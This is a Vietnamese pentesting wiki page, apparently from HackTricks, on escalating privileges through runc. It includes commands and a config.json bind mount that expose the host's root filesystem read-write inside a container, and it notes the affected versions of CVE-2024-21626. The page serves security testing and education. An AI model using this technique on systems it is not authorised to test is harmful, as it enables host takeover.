# Leo thang đặc quyền RunC

{{#include ../../banners/hacktricks-training.md}}

## Thông tin cơ bản

Nếu bạn muốn tìm hiểu thêm về **runc**, hãy xem trang sau:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Nếu `runc` khả dụng với một tiến trình chạy bằng quyền root trên host, bạn có thể dùng một OCI bundle có cấu hình mount bind-mount đệ quy `/` của host vào `/` bên trong container, qua đó để lộ hệ thống tệp của host trong mount namespace đó.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
    "type": "bind",
    "source": "/",
    "destination": "/",
    "options": [
        "rbind",
        "rw",
        "rprivate"
    ]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```

> [!CAUTION]
> Quy trình `runc run` được tài liệu hướng dẫn là rootful: các ví dụ của chính runc ghi rõ là “run as root.” Người dùng không đặc quyền cần cấu hình rootless, chẳng hạn `runc spec --rootless`; runc cũng ghi rõ rằng phải bật user namespaces để dùng chế độ này.<sup>[[1]](#references)</sup>

## Wrapper đặc quyền và phiên bản runtime

Một wrapper đặc quyền chấp nhận OCI bundle do người gọi kiểm soát có thể làm lộ các tệp trên host nếu cho phép bind mount không an toàn. Hãy kiểm tra xem wrapper có xử lý traversal và symlink trước khi xác thực nguồn và đích mount hay không, đồng thời xem wrapper có giới hạn `process.cwd` hay không. Chỉ riêng quy tắc sudo hoặc `config.json` có quyền ghi không chứng minh được rằng wrapper sẽ chấp nhận bundle hoặc chạy nó với đặc quyền host.

Riêng [CVE-2024-21626](https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv) ảnh hưởng đến các phiên bản `runc` upstream từ `1.0.0-rc93` đến `1.1.11`; `1.1.12` có bản vá upstream. File descriptor bị leak và việc xác thực thư mục làm việc không đầy đủ có thể khiến tiến trình container nằm ngoài root của nó trong một số quy trình `runc run` hoặc `runc exec`. Số file descriptor phụ thuộc vào cách gọi, và chuỗi phiên bản không đủ để xác định khả năng khai thác nếu nhà cung cấp đã backport bản vá hoặc người gọi không thể kiểm soát một lần gọi runtime có đặc quyền.

## References

- [1] [runc: Công cụ CLI để tạo và chạy container](https://github.com/opencontainers/runc#using-runc)
- [2] [Đặc tả OCI Runtime: Mounts](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [Cây con dùng chung](https://docs.kernel.org/filesystems/sharedsubtree.html)
{{#include ../../banners/hacktricks-training.md}}
